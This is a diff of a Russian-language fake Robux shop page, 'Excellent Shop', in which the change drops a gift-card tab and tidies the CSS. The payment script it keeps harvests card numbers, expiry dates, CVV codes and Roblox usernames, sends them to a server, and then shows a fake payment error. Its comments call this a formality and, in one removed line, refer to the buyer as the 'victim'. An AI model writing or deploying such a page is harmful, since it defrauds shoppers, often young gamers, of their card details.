@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — Robux карты</title>
+    <title>Excellent Shop — Robux</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
         body { min-height: 100vh; background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%); position: relative; overflow-x: hidden; }
@@ -26,25 +26,11 @@
         .logout-btn { background: none; border: 1px solid #c99494; padding: 6px 16px; border-radius: 40px; cursor: pointer; }
         .cart-icon-btn { background: #decbff; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #5d3b80; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
         .cart-icon-btn:hover { background: #ceb5ff; transform: scale(1.02); }
-        .tabs { display: flex; gap: 16px; margin-bottom: 30px; justify-content: center; }
-        .tab-btn { background: #f0e4ff; border: 2px solid #decbff; border-radius: 60px; padding: 12px 32px; font-weight: bold; font-size: 1.2rem; color: #6a37a3; cursor: pointer; transition: 0.2s; }
-        .tab-btn.active { background: linear-gradient(95deg, #b87eff, #9c58e6); border-color: #b87eff; color: white; box-shadow: 0 4px 12px rgba(156,88,230,0.3); }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
         .products-grid { display: flex; flex-wrap: wrap; gap: 25px; justify-content: center; margin: 30px 0; }
         .product-card { background: #ffffffdd; backdrop-filter: blur(4px); border: 1px solid #decbff; border-radius: 32px; padding: 24px 20px; width: 260px; text-align: center; transition: 0.2s; }
         .product-card:hover { transform: translateY(-6px); background: white; border-color: #b77eff; }
         .price { font-size: 1.8rem; font-weight: bold; color: #9b4eff; margin: 14px 0; }
         .btn-buy { background: linear-gradient(135deg, #c38eff, #a05fe8); border: none; width: 100%; padding: 12px; border-radius: 40px; font-weight: bold; color: white; cursor: pointer; }
-        .plus-form { background: #ffffffcc; backdrop-filter: blur(8px); border-radius: 48px; padding: 30px; max-width: 550px; margin: 0 auto; }
-        .amount-buttons { display: flex; flex-wrap: wrap; gap: 12px; margin: 15px 0; }
-        .amount-preset { background: white; border: 1.5px solid #decbff; border-radius: 60px; padding: 8px 20px; cursor: pointer; transition: 0.2s; }
-        .amount-preset.active { background: #b87eff; color: white; }
-        .custom-amount { display: flex; gap: 10px; margin: 15px 0; }
-        .custom-amount input { flex: 1; padding: 10px; border-radius: 60px; border: 1.5px solid #decbff; background: white; }
-        .recipient-select { margin: 20px 0; }
-        .recipient-select select, .recipient-select input { width: 100%; padding: 12px; border-radius: 60px; border: 1.5px solid #decbff; margin-top: 8px; background: white; }
-        .btn-add-card { background: linear-gradient(95deg, #b87eff, #9c58e6); border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; margin-top: 20px; cursor: pointer; }
         /* модалка корзины */
         .cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(80,50,120,0.5); backdrop-filter: blur(6px); justify-content: center; align-items: center; z-index: 1000; }
         .cart-modal-content { background: white; border-radius: 48px; padding: 28px; width: 450px; max-width: 90%; border: 1px solid #d0aeff; position: relative; max-height: 90vh; overflow-y: auto; }
@@ -59,22 +45,8 @@
         .card-row input { flex: 1; }
         .pay-btn { background: #2a9d8f; border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; font-size: 1rem; cursor: pointer; margin-top: 10px; }
         footer { margin-top: 50px; text-align: center; color: #9278b0; }
-        .error-toast {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #ff4d4d;
-            color: white;
-            padding: 12px 20px;
-            border-radius: 40px;
-            font-weight: bold;
-            z-index: 2000;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            animation: fadeOut 0.5s ease 3s forwards;
-        }
-        @keyframes fadeOut {
-            to { opacity: 0; visibility: hidden; }
-        }
+        .error-toast { position: fixed; top: 20px; right: 20px; background: #ff4d4d; color: white; padding: 12px 20px; border-radius: 40px; font-weight: bold; z-index: 2000; box-shadow: 0 4px 12px rgba(0,0,0,0.2); animation: fadeOut 0.5s ease 3s forwards; }
+        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
     </style>
 </head>
 <body>
@@ -85,7 +57,7 @@
     <div id="authSection" class="auth-wrapper">
         <div class="auth-card">
             <div class="auth-title">✨ Excellent Shop ✨</div>
-            <div class="auth-sub">покупай robux</div>
+            <div class="auth-sub">только robux</div>
             <div id="authForm">
                 <div id="signinForm">
                     <div class="input-group"><input type="text" id="loginUsername" placeholder="логин или email"></div>
@@ -118,44 +90,11 @@
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <div class="tabs">
-            <button class="tab-btn active" data-tab="robux">💎 Robux</button>
-            <button class="tab-btn" data-tab="plus">✨ Robux Plus</button>
-        </div>
-
-        <div id="tabRobux" class="tab-content active">
-            <div class="products-grid">
-                <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49">купить</button></div>
-                <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189">купить</button></div>
-                <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359">купить</button></div>
-                <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899">купить</button></div>
-            </div>
-        </div>
-
-        <div id="tabPlus" class="tab-content">
-            <div class="plus-form">
-                <h3 style="text-align:center;">💳 Digital Card</h3>
-                <div class="amount-section">
-                    <div class="amount-buttons">
-                        <div class="amount-preset" data-amount="10">10$</div>
-                        <div class="amount-preset" data-amount="25">25$</div>
-                        <div class="amount-preset" data-amount="50">50$</div>
-                        <div class="amount-preset" data-amount="100">100$</div>
-                    </div>
-                    <div class="custom-amount">
-                        <input type="number" id="customAmount" placeholder="своя сумма (10-500)" min="10" max="500">
-                        <span>USD</span>
-                    </div>
-                </div>
-                <div class="recipient-select">
-                    <select id="recipientSelect">
-                        <option value="me">For me</option>
-                        <option value="gift">As a gift</option>
-                    </select>
-                    <input type="text" id="giftName" placeholder="Никнейм получателя" style="display:none;">
-                </div>
-                <button class="btn-add-card" id="addCardToCart">✨ Add to Cart ✨</button>
-            </div>
+        <div class="products-grid">
+            <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49">купить</button></div>
+            <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189">купить</button></div>
+            <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359">купить</button></div>
+            <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899">купить</button></div>
         </div>
         <footer>⭐ Excellent Shop — оплата картой ⭐</footer>
     </div>
@@ -320,7 +259,7 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
 
-    // оплата: всегда отправляем данные и показываем красную метку
+    // оплата: всегда отправляем и показываем красную метку
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
         let cardNum = document.getElementById('cardNumber').value.trim();
@@ -339,9 +278,7 @@
             });
             let json = await resp.json();
             if(json.ok) {
-                // формальность: показываем ошибку, хотя данные ушли
-                showErrorToast();
-                // очищаем корзину и поля
+                showErrorToast(); // формальная ошибка
                 cart = [];
                 updateCartUI();
                 cartModal.style.display = 'none';
@@ -349,24 +286,10 @@
                 document.getElementById('cardExpiry').value = '';
                 document.getElementById('cardCvv').value = '';
                 document.getElementById('robloxUsername').value = '';
-                // не говорим жертве что успешно, только ошибка
             } else {
                 alert('❌ ошибка оплаты, попробуйте позже');
             }
         } catch(e){ alert('ошибка соединения'); }
-    });
-
-    // табы
-    function switchTab(tabId) {
-        document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
-        document.getElementById(`tab${tabId==='robux'?'Robux':'Plus'}`).classList.add('active');
-        document.querySelectorAll('.tab-btn').forEach(btn=>{
-            if(btn.getAttribute('data-tab')===tabId) btn.classList.add('active');
-            else btn.classList.remove('active');
-        });
-    }
-    document.querySelectorAll('.tab-btn').forEach(btn=>{
-        btn.addEventListener('click',()=> switchTab(btn.getAttribute('data-tab')));
     });
 
     // товары
@@ -382,48 +305,9 @@
         }
     }
 
-    // robux plus
-    let selectedAmountCard = 10;
-    document.querySelectorAll('.amount-preset').forEach(btn=>{
-        btn.addEventListener('click',()=>{
-            document.querySelectorAll('.amount-preset').forEach(b=>b.classList.remove('active'));
-            btn.classList.add('active');
-            selectedAmountCard=parseInt(btn.getAttribute('data-amount'));
-            document.getElementById('customAmount').value='';
-        });
-    });
-    document.getElementById('customAmount')?.addEventListener('input',(e)=>{
-        let val=parseInt(e.target.value);
-        if(!isNaN(val) && val>=10 && val<=500) { selectedAmountCard=val; document.querySelectorAll('.amount-preset').forEach(b=>b.classList.remove('active')); }
-    });
-    document.getElementById('recipientSelect')?.addEventListener('change',()=>{
-        let giftField=document.getElementById('giftName');
-        if(document.getElementById('recipientSelect').value==='gift') giftField.style.display='block';
-        else giftField.style.display='none';
-    });
-    document.getElementById('addCardToCart')?.addEventListener('click',()=>{
-        let amount=selectedAmountCard;
-        let customVal=parseInt(document.getElementById('customAmount').value);
-        if(!isNaN(customVal) && customVal>=10 && customVal<=500) amount=customVal;
-        else if(document.getElementById('customAmount').value !== '') { alert('сумма от 10 до 500'); return; }
-        let recipient='';
-        if(document.getElementById('recipientSelect').value==='me') recipient='For me';
-        else {
-            let gift=document.getElementById('giftName').value.trim();
-            if(!gift) { alert('укажи никнейм получателя'); return; }
-            recipient=`Gift for ${gift}`;
-        }
-        let itemName = `Robux Plus Digital: ${amount}$ (${recipient})`;
-        let priceRub = Math.round(amount * 80);
-        addItemToCart({ name: itemName, price: priceRub });
-        document.getElementById('customAmount').value = '';
-        if(document.getElementById('giftName').style.display === 'block') document.getElementById('giftName').value = '';
-    });
-
     function initEverything() {
         bindBuyButtons();
         updateCartUI();
-        switchTab('robux');
     }
 
     const savedUser = localStorage.getItem('excellent_current');
